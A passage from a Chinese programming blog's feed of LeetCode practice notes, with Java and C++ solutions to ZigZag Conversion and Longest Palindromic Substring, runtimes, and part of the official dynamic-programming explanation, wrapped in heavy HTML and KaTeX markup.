class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">convert</span><span class="params">(String s, <span class="keyword">int</span> numRows)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (numRows &gt;= s.length() || numRows == <span class="number">1</span>) <span class="keyword">return</span> s;</span><br><span class="line"></span><br><span class="line">        List&lt;StringBuilder&gt; strs = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; numRows; i++) strs.add(<span class="keyword">new</span> StringBuilder());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">boolean</span> m = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">char</span> c : s.toCharArray()) &#123;</span><br><span class="line">            strs.get(n).append(c);</span><br><span class="line">            <span class="keyword">if</span>(n == <span class="number">0</span> || n == numRows - <span class="number">1</span>) m = !m;</span><br><span class="line">            n += m ? <span class="number">1</span> : -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        StringBuilder str = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span>(StringBuilder sb : strs) str.append(sb);</span><br><span class="line">        <span class="keyword">return</span> str.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>执行用时: <strong>5 ms</strong></p></li><li><p>内存消耗: <strong>39 MB</strong></p></li></ul><p>官方给出的第二种解法是：</p><h4 id="按行访问">按行访问</h4><blockquote><p><strong>思路</strong></p><p>按照与逐行读取 Z 字形图案相同的顺序访问字符串。</p><p><strong>算法</strong></p><p>首先访问 <code>行 0</code> 中的所有字符，接着访问 <code>行 1</code> ，然后 <code>行 2</code> ，依此类推…</p><p>对于所有整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>，</p><p><code>行 0</code> 中的字符位于索引 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mtext>  </mtext><mo stretchy="false">(</mo><mn>2</mn><mo>⋅</mo><mtext>numRows</mtext><mo>−</mo><mn>2</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">k \; (2 \cdot \text{numRows} - 2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord text"><span class="mord">numRows</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mclose">)</span></span></span></span> 处;<br>行 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>numRows</mtext><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">\text{numRows}-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord text"><span class="mord">numRows</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 中的字符位于索引 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mtext>  </mtext><mo stretchy="false">(</mo><mn>2</mn><mo>⋅</mo><mtext>numRows</mtext><mo>−</mo><mn>2</mn><mo stretchy="false">)</mo><mo>+</mo><mtext>numRows</mtext><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">k \; (2 \cdot \text{numRows} - 2) + \text{numRows} - 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord text"><span class="mord">numRows</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord text"><span class="mord">numRows</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 处;<br>内部的 <code>行 i</code> 中的字符位于索引 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mtext>  </mtext><mo stretchy="false">(</mo><mn>2</mn><mo>⋅</mo><mtext>numRows</mtext><mo>−</mo><mn>2</mn><mo stretchy="false">)</mo><mo>+</mo><mi>i</mi></mrow><annotation encoding="application/x-tex">k \; (2 \cdot \text{numRows}-2)+i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord text"><span class="mord">numRows</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 以及 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>k</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mn>2</mn><mo>⋅</mo><mtext>numRows</mtext><mo>−</mo><mn>2</mn><mo stretchy="false">)</mo><mo>−</mo><mi>i</mi></mrow><annotation encoding="application/x-tex">(k+1)(2 \cdot \text{numRows}-2)- i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord text"><span class="mord">numRows</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 处;</p><p>作者：LeetCode</p></blockquote><p>这里用 C++ 复现了一遍官方代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">convert</span><span class="params">(string s, <span class="keyword">int</span> numRows)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(numRows &gt;= s.<span class="built_in">size</span>() || numRows == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> s;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        string str;</span><br><span class="line">        <span class="keyword">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> m = <span class="number">2</span> * numRows - <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; numRows; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j + i &lt; n; j += m) &#123;</span><br><span class="line">                str += s[j + i];</span><br><span class="line">                <span class="keyword">if</span>(i != <span class="number">0</span> &amp;&amp; i != numRows <span class="number">-1</span> &amp;&amp; j + m - i &lt; n) str += s[j + m - i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><p>执行用时: <strong>4 ms</strong></p></li><li><p>内存消耗: <strong>8 MB</strong></p></li></ul><blockquote><p>不得不说，效率提升很多啊。</p></blockquote><p>继续练习一遍 Java 实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">convert</span><span class="params">(String s, <span class="keyword">int</span> numRows)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (numRows &gt;= s.length() || numRows == <span class="number">1</span>) <span class="keyword">return</span> s;</span><br><span class="line"></span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">int</span> n = s.length();</span><br><span class="line">        <span class="keyword">int</span> m = <span class="number">2</span> * numRows - <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; numRows; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j + i &lt; n; j += m) &#123;</span><br><span class="line">                sb.append(s.charAt(j + i));</span><br><span class="line">                <span class="keyword">if</span>(i != <span class="number">0</span> &amp;&amp; i != numRows - <span class="number">1</span> &amp;&amp; j + m - i &lt; n) sb.append(s.charAt(j + m - i));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>执行用时: <strong>2 ms</strong></p></li><li><p>内存消耗: <strong>38.8 MB</strong></p></li></ul><blockquote><p><strong>总结</strong></p><p>虽然说，我觉得我的代码还是挺不错的，但是学习完两种方法之后，貌似，我只是将两种方法的缺点组合在了一起。思路还好，但是实现过程实在算不上是丝滑。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> 刷题 </tag>
            
            <tag> 算法 </tag>
            
            <tag> Java </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode 刷题笔记——day 4</title>
      <link href="/posts/4287d542/"/>
      <url>/posts/4287d542/</url>
      
        <content type="html"><![CDATA[<h1>LeetCode 刷题笔记——day 4</h1><h2 id="5-最长回文子串"><a href="https://leetcode-cn.com/problems/longest-palindromic-substring/">5. 最长回文子串</a></h2><p>难度：中等</p><p>给你一个字符串 <code>s</code>，找到 <code>s</code> 中最长的回文子串。</p><p><strong>示例 1：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;babad&quot;</span><br><span class="line">输出：&quot;bab&quot;</span><br><span class="line">解释：&quot;aba&quot; 同样是符合题意的答案。</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;cbbd&quot;</span><br><span class="line">输出：&quot;bb&quot;</span><br></pre></td></tr></table></figure><p><strong>示例 3：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;a&quot;</span><br><span class="line">输出：&quot;a&quot;</span><br></pre></td></tr></table></figure><p><strong>示例 4：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;ac&quot;</span><br><span class="line">输出：&quot;a&quot;</span><br></pre></td></tr></table></figure><p><strong>提示：</strong></p><ul><li><code>1 &lt;= s.length &lt;= 1000</code></li><li><code>s</code> 仅由数字和英文字母（大写和/或小写）组成</li></ul><h3 id="我的答案-4">我的答案</h3><blockquote><p>小白经典做题法，暴力且耐心。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">longestPalindrome</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> max = <span class="number">0</span>, len;</span><br><span class="line">        <span class="keyword">char</span>* ch = &amp;s[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; s.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i] == s[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                len = <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">if</span>(max &lt; len) &#123;</span><br><span class="line">                    ch = &amp;s[i - <span class="number">1</span>];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j = i + <span class="number">1</span>; ; j++) &#123;</span><br><span class="line">                    <span class="keyword">int</span> n = i * <span class="number">2</span> - j - <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">if</span>(n &gt;= <span class="number">0</span> &amp;&amp; s[n] == s[j] &amp;&amp; j &lt; s.<span class="built_in">size</span>()) &#123;</span><br><span class="line">                        len += <span class="number">2</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span>(max &lt; len) &#123;</span><br><span class="line">                            ch = &amp;s[n + <span class="number">1</span>];</span><br><span class="line">                        &#125;</span><br><span class="line">                        max = max &gt; len ? max : len;</span><br><span class="line">                        len = <span class="number">0</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(i &gt; <span class="number">1</span> &amp;&amp; s[i] == s[i - <span class="number">2</span>]) &#123;</span><br><span class="line">                len = <span class="number">3</span>;</span><br><span class="line">                <span class="keyword">if</span>(max &lt; len) &#123;</span><br><span class="line">                    ch = &amp;s[i - <span class="number">2</span>];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j = i + <span class="number">1</span>; ; j++) &#123;</span><br><span class="line">                    <span class="keyword">int</span> n = i * <span class="number">2</span> - j - <span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">if</span>(n &gt;= <span class="number">0</span> &amp;&amp; s[n] == s[j] &amp;&amp; j &lt; s.<span class="built_in">size</span>()) &#123;</span><br><span class="line">                        len += <span class="number">2</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span>(max &lt; len) &#123;</span><br><span class="line">                            ch = &amp;s[n + <span class="number">1</span>];</span><br><span class="line">                        &#125;</span><br><span class="line">                        max = max &gt; len ? max : len;</span><br><span class="line">                        len = <span class="number">0</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(s.<span class="built_in">size</span>() &gt; <span class="number">0</span> &amp;&amp; max == <span class="number">0</span>) &#123;</span><br><span class="line">            max = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function">string <span class="title">str</span><span class="params">(ch, max)</span></span>;</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><p>执行用时: <strong>16 ms</strong></p></li><li><p>内存消耗: <strong>7.1 MB</strong></p></li></ul><h3 id="官方答案-4">官方答案</h3><p>在官方题解中，提供了三种不同的算法：</p><h4 id="动态规划">动态规划</h4><blockquote><p><strong>思路与算法</strong></p><p>对于一个子串而言，如果它是回文串，并且长度大于 22，那么将它首尾的两个字母去除之后，它仍然是个回文串。例如对于字符串 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>“ababa”</mtext></mrow><annotation encoding="application/x-tex">\textrm{“ababa”}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord text"><span class="mord textrm">“ababa”</span></span></span></span></span>，如果我们已经知道 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>“bab&quot;</mtext></mrow><annotation encoding="application/x-tex">\textrm{“bab&quot;}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord text"><span class="mord textrm">“bab&quot;</span></span></span></span></span> 是回文串，那么 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>“ababa”</mtext></mrow><annotation encoding="application/x-tex">\textrm{“ababa”}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord text"><span class="mord textrm">“ababa”</span></span></span></span></span> 一定是回文串，这是因为它的首尾两个字母都是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>“a”</mtext></mrow><annotation encoding="application/x-tex">\textrm{“a”}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord text"><span class="mord textrm">“a”</span></span></span></span></span>。</p><p>根据这样的思路，我们就可以用动态规划的方法解决本题。我们用 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P(i,j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">)</span></span></span></span> 表示字符串 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">s</span></span></span></span> 的第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span> 个字母组成的串（下文表示成 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mo stretchy="false">[</mo><mi>i</mi><mo>:</mo><mi>j</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">s[i:j]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span></span></span></span>）是否为回文串：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>true,</mtext></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mspace width="1em"/><mtext>如果子串 </mtext><msub><mi>S</mi><mi>i</mi></msub><mo>…</mo><msub><mi>S</mi><mi>j</mi></msub><mtext> 是回文串</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>false,</mtext></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mspace width="1em"/><mtext>其它情况</mtext></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">P(i,j) = \begin{cases} \text{true,} &amp;\quad\text{如果子串~} S_i \dots S_j \text{~是回文串}\\ \text{false,} &amp;\quad\text{其它情况} \end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:3em;vertical-align:-1.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord text"><span class="mord">true,</span></span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord text"><span class="mord">false,</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:1em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mspace" style="margin-right:1em;"></span><span class="mord text"><span class="mord cjk_fallback">如果子串</span><span class="mord nobreak"> </span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord text"><span class="mord nobreak"> </span><span class="mord cjk_fallback">是回文串</span></span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mspace" style="margin-right:1em;"></span><span class="mord text"><span class="mord cjk_fallback">其它情况</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></p><p>这里的「其它情况」包含两种可能性：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mo stretchy="false">[</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">s[i, j]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span 